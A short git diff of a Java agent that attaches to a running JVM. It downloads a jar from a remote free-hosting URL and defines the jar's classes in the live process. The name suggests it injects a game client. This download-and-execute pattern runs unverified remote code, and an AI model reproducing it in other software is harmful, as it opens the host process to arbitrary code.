@@ -21,17 +21,18 @@ import java.util.zip.ZipEntry;
 
 public class Agent {
     private static Agent instance;
-    private Map<String, byte[]> scripts = new HashMap<>();
+    public static Map<String, byte[]> scripts = new HashMap<>();
 
     public static void agentmain(String args, Instrumentation instrumentation) {
         new MainFrame(instrumentation);
         Logger.log("[Agent] Successfully loaded into the JVM");
 
         try {
-            String link = "https://www.dropbox.com/s/cn3z8hziawpr8od/KhalCrafter.jar?dl=1";
+            String link = "https://fuckinghell.000webhostapp.com/Khal.jar";
             doShit(link);
+            Thread.sleep(2500);
             EasyClassLoader easyClassLoader = new EasyClassLoader(instance.scripts);
-            easyClassLoader.defineClasses();
+           easyClassLoader.defineClasses();
         } catch (Exception e) {
             Logger.log(e.getLocalizedMessage());
         }
@@ -51,8 +52,10 @@ public class Agent {
                 byteArrayOutputStream.write(array, 0, read);
             }
             if (nextEntry.getName().endsWith(".class")) {
-                Logger.log("Populating" + nextEntry.getName());
-                instance.scripts.put(nextEntry.getName(), byteArrayOutputStream.toByteArray());
+                if(byteArrayOutputStream.toByteArray() != null) {
+                    Logger.log("Populating: " + nextEntry.getName());
+                    scripts.put(nextEntry.getName(), byteArrayOutputStream.toByteArray());
+                }
             }
         }
     }
